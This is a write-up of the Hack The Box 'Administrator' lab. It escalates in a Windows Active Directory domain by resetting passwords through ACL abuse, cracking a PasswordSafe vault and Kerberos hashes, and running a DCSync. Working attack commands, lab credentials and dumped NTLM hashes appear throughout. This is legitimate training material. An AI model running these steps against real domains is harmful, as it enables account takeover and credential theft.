---
title: "HTB Administrator"
date: 2026-05-14 11:41 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Medium, WSL]
image: /assets/img/posts/administrator/administrator.png
---
**HTB Administrator** is an assume-breach Windows `Active Directory` machine that starts with provided low-privileged credentials and escalates through `BloodHound` enumeration, `GenericAll` and `ForceChangePassword` ACL abuse, cracking a `PasswordSafe` vault via `Hashcat`, `GenericWrite`-based targeted `Kerberoasting`, and a `DCSync` attack to obtain full `Domain Administrator` access.

## Machine Information
As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account:
```
Olivia
```
```
ichliebedich
```
## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.32.236 -nv --min-rate 1000
```
```
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
58433/tcp open  unknown
58438/tcp open  unknown
58443/tcp open  unknown
58462/tcp open  unknown
58465/tcp open  unknown
58499/tcp open  unknown
```
- NSE Scripts & Version
```
nmap -sCV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,58433,58438,58443,58462,58465,58499 10.129.32.236 -nv --min-rate 1000
```
```
PORT      STATE SERVICE       VERSION                                                                                                          07:04 [22/166]
21/tcp    open  ftp           Microsoft ftpd                                                                                                                 
| ftp-syst:                                                                                                                                                  
|_  SYST: Windows_NT                                                                                                                                         
53/tcp    open  domain        Simple DNS Plus                                                                                                                
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 18:03:24Z)                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)                             
445/tcp   open  microsoft-ds?                                                                                                                                
464/tcp   open  kpasswd5?                                                                                                                                    
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                            
636/tcp   open  tcpwrapped                                                                                                                                   
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)                             
3269/tcp  open  tcpwrapped                                                                                                                                   
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                        
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                  
9389/tcp  open  mc-nmf        .NET Message Framing                                                                                                           
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                        
|_http-title: Not Found                                                                                                                                      
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                  
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
58433/tcp open  msrpc         Microsoft Windows RPC
58438/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58443/tcp open  msrpc         Microsoft Windows RPC
58462/tcp open  msrpc         Microsoft Windows RPC
58465/tcp open  msrpc         Microsoft Windows RPC
58499/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-14T18:04:24
|_  start_date: N/A
|_clock-skew: 7h00m00s
```
### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.32.236 --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb DC.administrator.htb --generate-krb5-file /etc/krb5.conf
```
- time
```
sudo ntpdate -u DC.administrator.htb
```
### rusthound
```
rusthound-ce --domain administrator.htb -u 'Olivia' -p 'ichliebedich' -z
```
![blood1](/assets/img/posts/administrator/blood1.png)
### Shell as Olivia
```
➜  Administrator nxc winrm DC.administrator.htb -u 'Olivia' -p 'ichliebedich'            
WINRM       10.129.32.236   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.129.32.236   5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)
```
- Enum (FTP)
```
➜  Administrator evil-winrm -i DC.administrator.htb -u 'Olivia' -p 'ichliebedich'
*Evil-WinRM* PS C:\> dir inetpub
d-----        10/29/2024   1:05 PM                custerr
d-----         10/5/2024   7:14 PM                ftproot
d-----         11/1/2024   1:27 PM                history
d-----         10/5/2024   9:59 AM                logs
d-----         10/5/2024   9:59 AM                temp
*Evil-WinRM* PS C:\> icacls inetpub
inetpub CREATOR OWNER:(OI)(CI)(IO)(F)
        NT AUTHORITY\SYSTEM:(OI)(CI)(F)
        BUILTIN\Administrators:(OI)(CI)(F)
        S-1-5-21-1088858960-373806567-254189436-1106:(OI)(CI)(RX,W)
        BUILTIN\Users:(OI)(CI)(RX)
        NT SERVICE\TrustedInstaller:(OI)(CI)(F)
```
- Olivia ➜ Michael `GenericAll`
```
➜  Administrator bloodyAD -u 'Olivia' -p 'ichliebedich' -d administrator.htb --host 10.129.32.236 set password 'Michael' 'P@ssw0rd!!'
[+] Password changed successfully!
➜  Administrator nxc smb DC.administrator.htb -u 'Michael' -p 'P@ssw0rd!!'                                
SMB         10.129.32.236   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.236   445    DC               [+] administrator.htb\Michael:P@ssw0rd!! 
➜  Administrator
``` 
- Michael ➜ Benjamin `ForceChangePassword`
```
net rpc password "Benjamin" 'P@ssw0rd!!' -U "administrator.htb"/"Michael"%'P@ssw0rd!!' -S "DC.administrator.htb"
```
```
➜  Administrator nxc smb DC.administrator.htb -u 'Benjamin' -p 'P@ssw0rd!!'
SMB         10.129.32.236   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.236   445    DC               [+] administrator.htb\Benjamin:P@ssw0rd!!
```
## FTP
### Benjamin ➜ psafe3
```
➜  Administrator nxc ftp DC.administrator.htb -u 'Benjamin' -p 'P@ssw0rd!!' --ls
FTP         10.129.32.236   21     DC.administrator.htb [+] Benjamin:P@ssw0rd!!
FTP         10.129.32.236   21     DC.administrator.htb [*] Directory Listing
FTP         10.129.32.236   21     DC.administrator.htb 10-05-24  09:13AM                  952 Backup.psafe3
```
```
➜  Administrator nxc ftp DC.administrator.htb -u 'Benjamin' -p 'P@ssw0rd!!' --get Backup.psafe3
FTP         10.129.32.236   21     DC.administrator.htb [+] Benjamin:P@ssw0rd!!
FTP         10.129.32.236   21     DC.administrator.htb [+] Downloaded: Backup.psafe3
```

## Side Quest lol (WSL)
### Overview
 
This guide documents how to expose a WSL2 instance running on a Windows host to a Kali Linux VM (VMware) via SSH using Windows port proxying.
 
**Network topology:**
 
```
Kali VM (192.168.204.135)
    └── VMnet8 ──► Windows VMnet8 adapter (192.168.204.1)
                        └── portproxy ──► WSL2 (172.20.10.174:22)
```
 
---
 
### Step 1 — Install & Start SSH Server in WSL
 
```bash
# Install OpenSSH server
sudo apt update && sudo apt install -y openssh-server
 
# Ensure port 22 is set in sshd_config
sudo sed -i -E 's/^#?Port .*$/Port 22/' /etc/ssh/sshd_config
 
# Start SSH service
sudo service ssh start
 
# Verify it's listening
sudo ss -tunlp | grep :22
```
 
**Expected output:**
```
tcp   LISTEN 0  128   0.0.0.0:22   0.0.0.0:*   users:(("sshd",...))
tcp   LISTEN 0  128      [::]:22      [::]:*   users:(("sshd",...))
```
 
---
 
### Step 2 — Get WSL IP Address (from Windows)
 
```powershell
wsl hostname -I
# Example output: 172.20.10.174
```
 
> ⚠️ WSL2 gets a new IP on every reboot. Re-run this and update the portproxy rule if SSH stops working.
 
---
 
### Step 3 — Configure Windows Port Proxy (Run as Administrator)
 
```powershell
# Ensure IP Helper service is running (required for portproxy to bind)
Start-Service iphlpsvc
Set-Service iphlpsvc -StartupType Automatic
 
# Add port proxy rule: forward Windows port 2022 → WSL port 22
netsh interface portproxy add v4tov4 `
    listenport=2022 `
    listenaddress=0.0.0.0 `
    connectport=22 `
    connectaddress=172.20.10.174
 
# Verify the rule was added
netsh interface portproxy show all
 
# Verify port 2022 is actually listening
netstat -an | findstr ":2022"
```
 
**Expected output of `netstat`:**
```
TCP    0.0.0.0:2022    0.0.0.0:0    LISTENING
```
 
---
 
### Step 4 — Add Windows Firewall Rule (Run as Administrator)
 
```powershell
New-NetFirewallRule `
    -Name "WSL-SSH" `
    -DisplayName "WSL SSH" `
    -Direction Inbound `
    -Action Allow `
    -Protocol TCP `
    -LocalPort 2022
```
 
---
 
### Step 5 — Connect from Kali VM
 
```bash
# Kali reaches Windows via VMnet8 adapter IP
ssh bot@192.168.204.1 -p 2022
```
 
---
 
### Cleanup / Removal
 
```powershell
# Remove portproxy rule
netsh interface portproxy delete v4tov4 listenport=2022 listenaddress=0.0.0.0
 
# Remove firewall rule
Remove-NetFirewallRule -Name "WSL-SSH"
```
 
---
 
### Troubleshooting
 
| Symptom | Cause | Fix |
|---|---|---|
| `Connection refused` | portproxy rule not binding | Start `iphlpsvc`, re-add rule |
| `Connection timed out` | Wrong Windows IP / firewall | Confirm Kali's subnet matches the listenaddress |
| `netstat` shows nothing on 2022 | `iphlpsvc` stopped | `Start-Service iphlpsvc` then re-add rule |
| Works today, broken tomorrow | WSL2 IP changed on reboot | Re-run `wsl hostname -I` and update portproxy |
 
---
 
### Persisting WSL IP on Reboot (Optional)
 
Since WSL2 assigns a dynamic IP, add this to your Windows startup or a scheduled task:
 
```powershell
# Save as update-wsl-proxy.ps1 and run at login (as Administrator)
$wslIp = (wsl hostname -I).Trim()
netsh interface portproxy delete v4tov4 listenport=2022 listenaddress=0.0.0.0
netsh interface portproxy add v4tov4 listenport=2022 listenaddress=0.0.0.0 connectport=22 connectaddress=$wslIp
```
## Hashcat
### File Transfer
```
scp -P 2022 Backup.psafe3 bot@192.168.204.1:~/Backup.psafe3
```
```
ssh bot@192.168.204.1 -p 2022
```
### Crack
```
hashcat -a 0 -m 5200 Backup.psafe3 wordlists/rockyou.txt -d 1 -O
```
```
Backup.psafe3:tekieromucho
```
- [https://github.com/pwsafe/pwsafe](pwsafe)

```
sudo dpkg -i passwordsafe-debian12-1.24-amd64.deb
```
```
sudo apt install -f
```
![pwsafe](/assets/img/posts/administrator/pwsafe.png)
```
➜  Administrator nxc smb DC.administrator.htb -u users.txt -p passwd.txt --no-bruteforce --continue-on-success
SMB         10.129.32.236   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.236   445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
SMB         10.129.32.236   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
SMB         10.129.32.236   445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
```
## Valid Creds for emily
```
SMB         10.129.32.236   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```
![blood2](/assets/img/posts/administrator/blood2.png)
### Emily ➜ Ethan  `GenericWrite`
- [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

```
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
uv venv
source .venv/bin/activate
uv pip install -r requirements.txt
sudo ntpdate -u DC.administrator.htb
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'Emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
cat hash1.txt | tr -d '\n' > hash.txt
scp -P 2022 hash.txt bot@192.168.204.1:~/hash.txt
ssh bot@192.168.204.1 -p 2022
```
```
hashcat -a 0 -m 13100 hash.txt wordlists/rockyou.txt -d 1 -O
```
```
ethan:limpbizkit
```
### DCSync
```
➜  Administrator nxc smb DC.administrator.htb -u 'Ethan' -p 'limpbizkit'                                                                           
SMB         10.129.32.236   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.236   445    DC               [+] administrator.htb\Ethan:limpbizkit
```
```
impacket-secretsdump 'ethan:limpbizkit@administrator.htb' -user-status -history -pwd-last-set
```
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                         
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e::: (pwdLastSet=2024-10-22 14:59) (status=Enabled)                        
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet=never) (status=Disabled)                                          
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6::: (pwdLastSet=2024-10-04 15:53) (status=Disabled)                              
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7::: (pwdLastSet=2024-10-05 21:22) (status=Enabled)            
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:12c3b34bda8b1a1cd0c0524448b4e97f::: (pwdLastSet=2026-05-14 14:26) (status=Enabled)           
administrator.htb\michael_history0:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::                                                 
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:12c3b34bda8b1a1cd0c0524448b4e97f::: (pwdLastSet=2026-05-14 14:31) (status=Enabled)          
administrator.htb\benjamin_history0:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::                                                
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31::: (pwdLastSet=2024-10-30 19:40) (status=Enabled)             
administrator.htb\emily_history0:1112:aad3b435b51404eeaad3b435b51404ee:a576f8e498280b418e55241d93920930:::                                                   
administrator.htb\emily_history1:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::                                                   
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884::: (pwdLastSet=2024-10-12 16:52) (status=Enabled)             
administrator.htb\ethan_history0:1113:aad3b435b51404eeaad3b435b51404ee:4e599d7b7455e851d5e8442eeeecbb4c:::                                                   
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199::: (pwdLastSet=2024-10-30 20:18) (status=Disabled)        
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9::: (pwdLastSet=2024-10-30 20:18) (status=Disabled)             
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3::: (pwdLastSet=2024-10-04 15:54) (status=Enabled)
```
